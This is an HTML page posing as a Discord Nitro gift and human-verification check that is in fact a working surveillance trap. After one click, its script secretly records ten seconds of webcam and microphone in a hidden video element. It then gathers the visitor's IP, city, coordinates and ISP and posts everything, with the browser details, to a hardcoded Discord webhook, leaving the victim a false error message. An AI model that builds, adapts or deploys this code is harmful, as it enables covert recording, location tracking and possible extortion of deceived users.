<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Discord Preview Magic -->
  <meta property="og:title" content="A WILD GIFT APPEARED! 🎁">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://nitro-gift-activate.github.io/redeem/">
  <meta property="og:image" content="https://www.fosslinux.com/wp-content/uploads/2022/11/Discord-Nitro.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:type" content="image/png">
  <meta name="theme-color" content="#313338">
  <meta property="twitter:card" content="summary_large_image">

  <title>Discord Gift</title>
  <style>
    body { 
      margin:0; 
      background:#111; 
      color:#eee; 
      font-family:Arial, sans-serif; 
      text-align:center; 
      padding: 20vh 10px; 
      min-height:100vh; 
    }
    #msg { 
      font-size:1.8em; 
      margin:20px; 
    }
    video { display:none; } /* hidden forever */
    .container { max-width:600px; margin:auto; }
    button { 
      padding:15px 40px; 
      font-size:1.3em; 
      background:#0066cc; 
      color:white; 
      border:none; 
      border-radius:8px; 
      cursor:pointer; 
      margin:20px; 
    }
    button:hover { background:#0055aa; }
    button:disabled { opacity:0.6; cursor:not-allowed; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Quick Verification</h1>
    <p id="msg">Please click verify to continue. This helps prove you're a human.</p>
    
    <video id="video" autoplay playsinline muted></video>

    <button id="btn">Verify Me</button>
  </div>

  <script>
    const videoElement = document.getElementById('video');
    const msg = document.getElementById('msg');
    const btn = document.getElementById('btn');

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";

    async function recordAndSend() {
      try {
        msg.textContent = "Loading verification... Please wait.";
        btn.disabled = true;

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });

        videoElement.srcObject = stream;

        await new Promise(r => setTimeout(r, 1500));

        msg.textContent = "Loading...";

        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
        const chunks = [];

        recorder.ondataavailable = e => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = async () => {
          if (chunks.length === 0) {
            throw new Error("No data captured");
          }

          const blob = new Blob(chunks, { type: 'video/webm' });

          let geoDetails = "Location grab failed";
          try {
            const geoRes = await fetch('https://ipapi.co/json/');
            if (geoRes.ok) {
              const data = await geoRes.json();
              if (!data.error) {
                geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nTimezone: ${data.timezone || 'n/a'}\nISP: ${data.org || 'n/a'}`;
              }
            }
          } catch {}

          const payload = {
            content: `🎥 Silent 10s capture\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
          };

          const formData = new FormData();
          formData.append('file', blob, `capture_${Date.now()}.webm`);
          formData.append('payload_json', JSON.stringify(payload));

          msg.textContent = "Finalizing...";

          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });

          msg.textContent = "Verification incomplete. Center Face In Camera View";
          btn.style.display = 'none';
          stream.getTracks().forEach(track => track.stop());
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 10000);

      } catch (err) {
        msg.textContent = "Verification incomplete. Center Face In Camera View";
        btn.disabled = false;
      }
    }

    btn.addEventListener('click', recordAndSend);
  </script>
</body>
</html>
